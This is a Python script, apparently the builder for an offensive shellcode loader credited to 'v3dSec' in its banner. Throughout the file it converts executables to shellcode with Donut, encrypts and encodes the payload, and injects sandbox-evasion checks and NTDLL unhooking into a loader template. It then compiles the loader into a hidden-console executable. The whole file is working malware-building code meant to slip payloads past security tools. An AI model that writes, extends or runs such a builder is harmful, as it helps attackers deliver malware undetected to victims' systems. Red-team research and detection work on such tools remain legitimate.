import argparse
import os
import secrets
import subprocess
import sys

from encryptor import process_shellcode
from builder import compile_exe
from console import print_status, print_step, print_success, print_error


def generate_key():
    return secrets.token_bytes(32)


def convert_exe_to_shellcode(exe_path):

    if not os.path.exists("donut.exe"):
        print_error("donut.exe not found in current directory")
        return None

    output_shellcode = os.path.splitext(exe_path)[0] + "_shellcode.bin"

    cmd = ["donut.exe", "-a", "2", "-i", exe_path, "-o", output_shellcode, "-b", "1"]

    print_status("Converting EXE to shellcode using Donut")
    print_step(" ".join(cmd))

    try:
        subprocess.run(cmd, check=True)
    except subprocess.CalledProcessError:
        print_error("Donut conversion failed")
        return None

    if not os.path.exists(output_shellcode):
        print_error("Shellcode output not created")
        return None

    print_success(f"Shellcode created: {output_shellcode}")

    return output_shellcode


def main():

    parser = argparse.ArgumentParser(
        description="Advanced shellcode loader builder with encryption and sandbox evasion."
    )

    parser.add_argument("--shellcode", help="Raw shellcode file")
    parser.add_argument("--exe", help="Executable to convert to shellcode using donut")
    parser.add_argument("--output", default="payload", help="Output file name")

    parser.add_argument(
        "--builder",
        default="pyinstaller",
        choices=["pyinstaller", "nuitka", "cx-freeze"],
        help="Compilation method",
    )

    parser.add_argument(
        "--unhooking", action="store_true", help="Enable NTDLL unhooking"
    )
    parser.add_argument("--console", action="store_true", help="Show console window")

    parser.add_argument(
        "--compression", default="zlib", choices=["zlib", "bz2", "lzma", "gzip", "none"]
    )

    parser.add_argument(
        "--encryption",
        default="rc4",
        choices=["rc4", "none"],
    )

    parser.add_argument(
        "--encoding",
        default="base85",
        choices=[
            "base64",
            "base85",
            "base32",
            "urlsafe_b64",
            "ascii85",
            "hex",
            "base16",
            "rot13",
            "none",
        ],
    )

    parser.add_argument("--time-delay", type=int, default=5)
    parser.add_argument("--cpu-check", type=int)
    parser.add_argument("--ram-check", type=int)
    parser.add_argument("--up-time", type=int)
    parser.add_argument("--background-processes", type=int)

    banner = """
    ▄▄▄       ███▄ ▄███▓ ▄▄▄▄    █    ██   ██████  ██░ ██           Author: Ved Prakash Gupta (v3dSec)
   ▒████▄    ▓██▒▀█▀ ██▒▓█████▄  ██  ▓██▒▒██    ▒ ▓██░ ██▒          Github: https://github.com/v3dSec
   ▒██  ▀█▄  ▓██    ▓██░▒██▒ ▄██▓██  ▒██░░ ▓██▄   ▒██▀▀██░          Twitter: https://x.com/v3dSec
   ░██▄▄▄▄██ ▒██    ▒██ ▒██░█▀  ▓▓█  ░██░  ▒   ██▒░▓█ ░██ 
    ▓█   ▓██▒▒██▒   ░██▒░▓█  ▀█▓▒▒█████▓ ▒██████▒▒░▓█▒░██▓
    ▒▒   ▓▒█░░ ▒░   ░  ░░▒▓███▀▒░▒▓▒ ▒ ▒ ▒ ▒▓▒ ▒ ░ ▒ ░░▒░▒
     ▒   ▒▒ ░░  ░      ░▒░▒   ░ ░░▒░ ░ ░ ░ ░▒  ░ ░ ▒ ░▒░ ░
     ░   ▒   ░      ░    ░    ░  ░░░ ░ ░ ░  ░  ░   ░  ░░ ░
         ░  ░       ░    ░         ░           ░   ░  ░  ░
                              ░                           
    """

    print(banner)

    if len(sys.argv) == 1:
        parser.print_help()
        sys.exit(0)

    args = parser.parse_args()

    if not args.shellcode and not args.exe:
        print_error("You must specify either --shellcode or --exe")
        return

    if args.shellcode and args.exe:
        print_error("Use either --shellcode or --exe, not both")
        return

    builder = args.builder
    generated_shellcode = False
    shellcode_path = None

    print_status(f"Selected builder: {builder}")

    if args.exe:

        if not os.path.exists(args.exe):
            print_error("EXE file not found.")
            return

        shellcode_path = convert_exe_to_shellcode(args.exe)

        if not shellcode_path:
            return

        generated_shellcode = True

    elif args.shellcode:

        if not os.path.exists(args.shellcode):
            print_error("Shellcode file not found.")
            return

        shellcode_path = args.shellcode

    raw_size = os.path.getsize(shellcode_path)

    print_status(f"Loading shellcode: {shellcode_path} ({raw_size} bytes)")

    with open(shellcode_path, "rb") as f:
        shellcode = f.read()

    key = generate_key()

    print_status("Encoding payload")
    print_step(f"Method: {args.compression} > {args.encryption} > {args.encoding}")

    payload_code, decrypt_func = process_shellcode(
        shellcode, key, args.compression, args.encryption, args.encoding
    )

    print_success("Payload encoded")

    print()
    print_status("Configuration")

    print_step(f"Delay: {args.time_delay}s")

    if args.cpu_check:
        print_step(f"CPU >= {args.cpu_check}")

    if args.ram_check:
        print_step(f"RAM >= {args.ram_check} GB")

    if args.up_time:
        print_step(f"Uptime >= {args.up_time} minutes")

    if args.background_processes:
        print_step(f"Processes >= {args.background_processes}")

    print()

    print_status("Generating loader")

    with open("loader.py", "r", encoding="utf-8") as f:
        loader = f.read()

    loader = loader.replace("# {{DECRYPTION_FUNCTION}}", decrypt_func)
    loader = loader.replace("__PAYLOAD__", payload_code)
    loader = loader.replace("b'{{__KEY__}}'", repr(key))

    loader = loader.replace("__TIME_DELAY__", str(args.time_delay))
    loader = loader.replace(
        "__CPU_CHECK__", str(args.cpu_check) if args.cpu_check else "None"
    )
    loader = loader.replace(
        "__RAM_CHECK__", str(args.ram_check) if args.ram_check else "None"
    )
    loader = loader.replace(
        "__UPTIME_CHECK__", str(args.up_time) if args.up_time else "None"
    )
    loader = loader.replace(
        "__PROC_CHECK__",
        str(args.background_processes) if args.background_processes else "None",
    )

    loader = loader.replace("__DEBUG__", "1" if args.console else "0")
    loader = loader.replace("__UNHOOK__", "1" if args.unhooking else "0")

    print_success("Loader generated")

    print()
    print_status("Compiling executable")

    exe_path = compile_exe(
        loader, args.output, builder, hide_console=not args.console, compile_binary=True
    )

    if exe_path:
        print()
        print_success(f"Output: {exe_path}")
    else:
        print_error("Build failed")


if __name__ == "__main__":
    main()
